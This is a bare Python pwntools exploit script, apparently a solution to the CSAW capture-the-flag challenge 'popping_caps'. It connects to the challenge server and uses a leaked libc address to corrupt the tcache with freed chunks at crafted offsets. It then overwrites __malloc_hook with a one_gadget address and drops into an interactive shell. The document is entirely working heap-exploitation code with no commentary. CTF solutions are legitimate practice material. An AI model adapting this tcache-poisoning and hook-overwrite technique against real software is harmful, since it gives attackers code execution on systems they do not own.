#!/usr/bin/python

from pwn import *

elf = ELF('./popping_caps')
libc = ELF("./libc.so.6")
#conn=process('./popping_caps')
conn = remote("pwn.chal.csaw.io", 1001)

conn.recvuntil("Here is system 0x")
base=int(conn.recvline()[:-1],16) - libc.symbols["system"]
conn.clean()

def malloc(size):
  conn.sendline("1")
  conn.sendline(str(size))
  conn.clean()

def free(offset):
  conn.sendline("2")
  conn.sendline(str(offset))
  conn.clean()

def write(payload):
  conn.sendline("3")
  if len(payload) >= 8:
    payload = payload[:8]
    conn.send(payload)
  else:
    conn.sendline(payload)
  conn.clean()

def byte():
  conn.sendline("4")
  conn.interactive()

malloc(0x400 - 0x60) 
free(0)
free(-0x260 + 0x50)
malloc(0xf0)
write(p64(base + libc.symbols["__malloc_hook"]))
malloc(0x10)
write(p64(base + [0x4f2c5, 0x4f322, 0x10a38c][2]))


conn.interactive()
